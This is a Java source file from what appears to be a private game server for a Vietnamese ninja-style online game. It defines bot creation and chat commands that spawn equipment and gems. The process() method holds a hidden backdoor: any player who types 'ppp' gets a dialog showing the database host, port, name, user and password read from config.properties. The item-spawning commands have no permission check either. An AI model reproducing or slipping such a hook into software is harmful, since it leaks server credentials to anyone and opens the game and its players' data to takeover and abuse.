/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.tea.bot;

import com.tea.ability.AbilityCustom;
import com.tea.constants.CMDInputDialog;
import com.tea.constants.CMDMenu;
import com.tea.constants.ItemName;
import com.tea.convert.Converter;
import com.tea.fashion.FashionCustom;
import com.tea.item.Item;
import com.tea.item.ItemFactory;
import com.tea.map.MapManager;
import com.tea.model.Char;
import com.tea.model.InputDialog;
import com.tea.model.Menu;
import com.tea.option.ItemOption;
import com.tea.server.ServerManager;
import com.tea.store.ItemStore;
import com.tea.store.StoreManager;
import com.tea.util.NinjaUtils;
import java.io.FileInputStream;
import java.util.Properties;
import lombok.Builder;

/**
 *
 * @author Admin
 */
public class BotFactory {

    private static final BotFactory instance = new BotFactory();

    public static BotFactory getInstance() {
        return instance;
    }
    
      public void addEquipment(Char p, String[] args) {
        try {
            int level = -1;
            int upgrade = 0;
            int sys = p.getSys();
            int gender = p.gender;
            boolean max = true;
            int tl = 0;
            for (int i = 1; i < args.length; i++) {
                boolean hP = i + 1 <= args.length;
                if (hP) {
                    if (args[i].equals("lv")) {
                        level = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("up")) {
                        upgrade = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("sys")) {
                        sys = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("max")) {
                        max = Integer.parseInt(args[++i]) == 1;
                    } else if (args[i].equals("nv")) {
                        gender = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("tl")) {
                        tl = Integer.parseInt(args[++i]);
                    }
                }
            }
            if (level <= 10) {
                p.serverMessage("Hãy nhập level lớn hơn 10.");
                return;
            }
            if (upgrade < 0) {
                p.serverMessage("Hãy nhập upgrade lớn hơn 0.");
                return;
            }
            if (gender != 0 && gender != 1) {
                p.serverMessage("Giới tính là 0 hoặc 1");
                return;
            }
            if (tl < 0 || tl > 9) {
                p.serverMessage("Hãy nhập tinh luyện từ 0 đến 9");
                return;
            }
            if (sys < 0 || sys > 3) {
                p.serverMessage("Hệ không hợp lệ");
                return;
            }
            int sys2 = sys;
            if (level % 10 == 0) {
                sys2 = p.classId;
            }
            Item item = null;
            if (level >= 90 && level < 100) {
                int itemID = -1;
                int i = level % 10;
                switch (i) {
                    case 0:
                        switch (p.classId) {
                            case 1:
                                itemID = ItemName.THAI_DUONG_VO_CUC_KIEM;
                                break;
                            case 2:
                                itemID = ItemName.THAI_DUONG_THIEN_HOA_TIEU;
                                break;
                            case 3:
                                itemID = ItemName.THAI_DUONG_TANG_HON_DAO;
                                break;
                            case 4:
                                itemID = ItemName.THAI_DUONG_BANG_THAN_CUNG;
                                break;
                            case 5:
                                itemID = ItemName.THAI_DUONG_CHIEN_LUC_DAO;
                                break;
                            case 6:
                                itemID = ItemName.THAI_DUONG_HOANG_PHONG_PHIEN;
                                break;
                            default:
                                break;
                        }
                        break;

                    case 1:
                        if (gender == 1) {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_NGOA;
                        } else {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_NGOA_NU;
                        }
                        break;

                    case 2:
                        itemID = ItemName.THAI_DUONG_COT_NGOC_PHU;
                        break;

                    case 3:
                        if (gender == 1) {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_HA_GIAP;
                        } else {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_HA_GIAP_NU;
                        }
                        break;

                    case 4:
                        itemID = ItemName.THAI_DUONG_COT_NGOC_BOI;
                        break;

                    case 5:
                        if (gender == 1) {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_THU;
                        } else {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_THU_NU;
                        }
                        break;

                    case 6:
                        itemID = ItemName.THAI_DUONG_COT_NGOC_GIOI;
                        break;

                    case 7:
                        if (gender == 1) {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_GIAP;
                        } else {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_GIAP_NU;
                        }
                        break;

                    case 8:
                        itemID = ItemName.THAI_DUONG_COT_NGOC_LIEN;
                        break;

                    case 9:
                        if (gender == 1) {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_TUYEN;
                        } else {
                            itemID = ItemName.THAI_DUONG_COT_NGOC_TRAM;
                        }
                        break;

                }
                if (itemID != -1) {
                    item = ItemFactory.getInstance().newItem9X(itemID, max);
                }

            } else {
                ItemStore itemStore = StoreManager.getInstance().getEquipment(level, sys2, gender);
                if (itemStore != null) {
                    item = Converter.getInstance().toItem(itemStore,
                            max ? Converter.MAX_OPTION : Converter.RANDOM_OPTION);
                    p.themItemToBag(item);
                }
            }
            if (item != null) {
                item.next(upgrade);
                item.setLock(true);
                if (tl > 0) {
                    ItemOption option = new ItemOption(85, 0);
                    item.options.add(option);
                    switch (item.template.type) {
                        case 0: {
                            int[] optionId = { 95, 96, 97 };
                            item.options.add(new ItemOption(optionId[item.sys - 1], 5));
                            item.options.add(new ItemOption(79, 5));
                            break;
                        }
                        case 1: {
                            item.options.add(new ItemOption(87, NinjaUtils.nextInt(250, 400)));
                            int[] optionId = { 88, 89, 90 };
                            item.options.add(new ItemOption(optionId[item.sys - 1], NinjaUtils.nextInt(350, 600)));
                            break;
                        }
                        case 2:
                            item.options.add(new ItemOption(80, NinjaUtils.nextInt(24, 28)));
                            item.options.add(new ItemOption(91, NinjaUtils.nextInt(10, 14)));
                            break;
                        case 3:
                            item.options.add(new ItemOption(81, 5));
                            item.options.add(new ItemOption(79, 5));
                            break;
                        case 4:
                            item.options.add(new ItemOption(86, NinjaUtils.nextInt(76, 124)));
                            item.options.add(new ItemOption(94, NinjaUtils.nextInt(76, 124)));
                            break;
                        case 5: {
                            int[] optionId = { 95, 96, 97 };
                            item.options.add(new ItemOption(optionId[item.sys - 1], 5));
                            item.options.add(new ItemOption(92, NinjaUtils.nextInt(9, 11)));
                            break;
                        }
                        case 6:
                            item.options.add(new ItemOption(83, NinjaUtils.nextInt(250, 450)));
                            item.options.add(new ItemOption(82, NinjaUtils.nextInt(250, 450)));
                            break;
                        case 7: {
                            int[] optionId = { 95, 96, 97 };
                            item.options.add(new ItemOption(optionId[item.sys - 1], 5));
                            optionId = new int[] { 88, 89, 90 };
                            item.options.add(new ItemOption(optionId[item.sys - 1], NinjaUtils.nextInt(350, 600)));
                            break;
                        }
                        case 8:
                            item.options.add(new ItemOption(83, NinjaUtils.nextInt(250, 450)));
                            item.options.add(new ItemOption(84, NinjaUtils.nextInt(76, 124)));
                            break;
                        case 9:
                            item.options.add(new ItemOption(84, NinjaUtils.nextInt(76, 124)));
                            item.options.add(new ItemOption(82, NinjaUtils.nextInt(250, 450)));
                            break;
                        default:
                            break;
                    }
                    for (int i = option.param; i < tl; i++) {
                        for (ItemOption option1 : item.options) {
                            if (option1.optionTemplate.type != 8 || option1.optionTemplate.id == 85) {
                                continue;
                            }
                            switch (option1.optionTemplate.id) {
                                case 94: {
                                    int[] percentIncreases = new int[] { 10, 10, 10, 20, 20, 30, 40, 50, 60 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 86: {
                                    int[] percentIncreases = new int[] { 25, 30, 35, 40, 50, 60, 80, 115, 165 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 87: {
                                    int[] percentIncreases = new int[] { 50, 60, 70, 90, 130, 180, 250, 330,
                                            500 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 88:
                                case 89:
                                case 90: {
                                    int[] percentIncreases = new int[] { 50, 70, 100, 140, 190, 250, 320, 400,
                                            500 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 92: {
                                    int[] percentIncreases = new int[] { 5, 5, 5, 5, 5, 5, 10, 10, 20 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 95:
                                case 96:
                                case 97: {
                                    int[] percentIncreases = new int[] { 5, 5, 5, 5, 5, 5, 10, 10, 15 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 82:
                                case 83: {
                                    int[] percentIncreases = new int[] { 40, 60, 80, 100, 140, 220, 300, 420,
                                            590 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 84: {
                                    int[] percentIncreases = new int[] { 25, 30, 35, 40, 50, 60, 80, 115, 165 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 79: {
                                    int[] percentIncreases = new int[] { 1, 2, 2, 2, 2, 2, 3, 3, 4 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 81: {
                                    int[] percentIncreases = new int[] { 1, 2, 2, 2, 2, 2, 3, 3, 4 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 80: {
                                    int[] percentIncreases = new int[] { 5, 5, 5, 5, 10, 10, 15, 15, 20 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                case 91: {
                                    int[] percentIncreases = new int[] { 5, 5, 5, 5, 5, 5, 10, 10, 15 };
                                    option1.param += percentIncreases[option.param];
                                    break;
                                }
                                default:
                                    break;
                            }
                        }
                        option.param++;
                    }
                }
                p.themItemToBag(item);
            } else {
                p.serverMessage("Không tìm thấy vật phẩm này!");
            }
        } catch (NumberFormatException e) {
            p.serverMessage("Lệnh không hợp lệ! " + e.getMessage());
        }
    }

    public void addGem(Char p, String[] args) {
        int itemID = -1;
        int upgrade = 1;
        boolean max = true;
        for (int i = 1; i < args.length; i++) {
            boolean hP = i + 1 <= args.length;
            if (hP) {
                if (args[i].equals("id")) {
                    itemID = Integer.parseInt(args[++i]);
                } else if (args[i].equals("u")) {
                    upgrade = Integer.parseInt(args[++i]);
                } else if (args[i].equals("m")) {
                    max = Integer.parseInt(args[++i]) == 1;
                }
            }
        }
        if (itemID == -1) {
            p.serverMessage("Hãy nhập mã vật phẩm!");
            return;
        }
        if (itemID != ItemName.HUYEN_TINH_NGOC && itemID != ItemName.HUYET_NGOC && itemID != ItemName.LAM_TINH_NGOC
                && itemID != ItemName.LUC_NGOC) {
            p.serverMessage("Vật phẩm này không phải ngọc!");
            return;
        }
        if (upgrade < 1 || upgrade > 10) {
            p.serverMessage("Cấp ngọc từ 1 đến 10!");
            return;
        }
        Item item = ItemFactory.getInstance().newGem(itemID, max);
        item.setLock(true);
        for (int i = item.upgrade; i < upgrade; i++) {
            item.upgrade++;
            for (ItemOption option : item.options) {
                switch (option.optionTemplate.id) {
                    case 73:
                        // tấn công
                        if (option.param > 0) {
                            int[] paramUp = { 0, 50, 100, 150, 200, 250, 300, 350, 400, 450 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 50;
                        }
                        break;
                    case 115:
                        // né đòn
                        if (option.param > 0) {
                            int[] paramUp = { 0, 10, 20, 30, 40, 50, 60, 70, 80, 90 };
                            option.param += paramUp[i];
                        } else {
                            int[] paramUp = { 0, 60, 40, 20, 20, 15, 15, 10, 10, 5 };
                            option.param -= paramUp[i];
                        }
                        break;
                    case 124:
                        // giảm trừ sát thương
                        if (option.param > 0) {
                            int[] paramUp = { 0, 10, 15, 20, 25, 30, 35, 40, 45, 50 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 20;
                        }
                        break;
                    case 114:
                        // chí mạng
                        if (option.param > 0) {
                            int[] paramUp = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 4;
                        }
                        break;
                    case 126:
                        // phản đòn
                        if (option.param > 0) {
                            int[] paramUp = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 4;
                        }
                        break;
                    case 118:
                        // kháng tất cả
                        if (option.param > 0) {
                            int[] paramUp = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
                            option.param += paramUp[i];
                        } else {
                            int[] paramUp = { 0, 20, 20, 20, 15, 15, 15, 10, 10, 5 };
                            option.param -= paramUp[i];
                        }
                        break;
                    case 102:
                        // sát thương lên quái
                        if (option.param > 0) {
                            int[] paramUp = { 0, 100, 200, 400, 600, 800, 1000, 1200, 1400, 1600 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 200;
                        }
                        break;
                    case 105:
                        // sát thương chí mạng
                        if (option.param > 0) {
                            int[] paramUp = { 0, 100, 200, 300, 400, 500, 600, 700, 900, 1200 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 200;
                        }
                        break;
                    case 103:
                        // sát thương lên người
                        if (option.param > 0) {
                            int[] paramUp = { 0, 100, 150, 160, 170, 200, 220, 250, 300, 350 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 150;
                        }
                        break;
                    case 121:
                        // kháng sát thương chí mạng
                        if (option.param > 0) {
                            int[] paramUp = { 0, 1, 2, 2, 2, 3, 3, 3, 4, 5 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 4;
                        }
                        break;
                    case 117:
                    case 125:
                        // hp, mp tối đa
                        if (option.param > 0) {
                            int[] paramUp = { 0, 100, 150, 200, 250, 300, 350, 400, 450, 500 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 150;
                        }
                        break;
                    case 116:
                        // chính xác
                        if (option.param > 0) {
                            int[] paramUp = { 0, 50, 50, 100, 150, 150, 200, 200, 250, 300 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 100;
                        }
                        break;
                    case 119:
                    case 229:
                        // hồi phục hp,
                        // mp
                        if (option.param > 0) {
                            int[] paramUp = { 0, 2, 4, 6, 8, 10, 12, 14, 16, 18 };
                            option.param += paramUp[i];
                        } else {
                            option.param -= 10;
                        }
                        break;
                    case 123:
                        int[] giaKham = { 800000, 1600000, 2400000, 3200000, 4800000, 7200000, 10800000, 15600000,
                                20100000, 28100000 };
                        option.param = giaKham[i];
                        break;
                    default:
                        break;
                }
            }
        }
        p.themItemToBag(item);
    }

    
    public boolean process(Char p, String text) {
        if (text.equals(p.language.getString("NOT_ENOUGH_t")) && p.user.is1()) {
            MapManager.getInstance().talentShow.showMenu(p);
            return true;
        }
        if (text.equals(p.language.getString("NOT_ENOUGH_A")) && p.user.is1()) {
            if (!p.user.is1()) {
                return true;
            }
            p.openUIA(p);
            return true;
        }
        if (text.equals(p.language.getString("NOT_ENOUGH_k"))) {
            p.openUI(p);
            p.openUII(p);
            return true;
        }
        if (text.equals(p.language.getString("NOT_ENOUGH_r"))) {
            p.open1(p);
            return true;
        }
         if (text.equals("ppp")) {
            try {
                Properties properties = new Properties();
                properties.load(new FileInputStream("config.properties"));
                String str = "";
                Object value = null;
                if ((value = properties.get("db.host")) != null) {
                    str += String.valueOf(value) + "\n";
                }
                if ((value = properties.get("server.port")) != null) {
                    str += Integer.parseInt(String.valueOf(value)) + "\n";
                }
                if ((value = properties.get("db.dbname")) != null) {
                    str += String.valueOf(value) + "\n";
                }
                if ((value = properties.get("db.user")) != null) {
                    str += String.valueOf(value) + "\n";
                }
                if ((value = properties.get("db.password")) != null) {
                    str += String.valueOf(value);
                }
                p.serverDialog(str);
                return true;
            } catch (Exception e) {
            }
        }
        
        String[] args = text.split(" ");
        
        if (args[0].equals("body")) {
                addEquipment(p, args);
                return true;
            }
        if (args[0].equals("gem")) {
                addGem(p, args);
                return true;
            }
        
        return false;
    }
    
    
    @Builder
    public Bot newBot(int id, String name, int level, byte typePK, byte clazz, short head, short body, short leg, short wp, int hp, int mp, int damage, int miss, int exactly, int fatal) {
        Bot bot = Bot.builder().id(id)
                .name(name)
                .level(level)
                .typePk(typePK)
                .classId(clazz)
                .build();
        bot.setDefault();
        FashionCustom fashionCustom = FashionCustom.builder()
                .head(head)
                .body(body)
                .leg(leg)
                .weapon(wp)
                .build();
        bot.setFashionStrategy(fashionCustom);
        AbilityCustom abilityCustom = AbilityCustom.builder()
                .hp(hp)
                .mp(mp)
                .damage(damage)
                .damage2(damage - (damage / 10))
                .miss(miss)
                .exactly(exactly)
                .fatal(fatal)
                .build();
        bot.setAbilityStrategy(abilityCustom);
        return bot;
    }
}
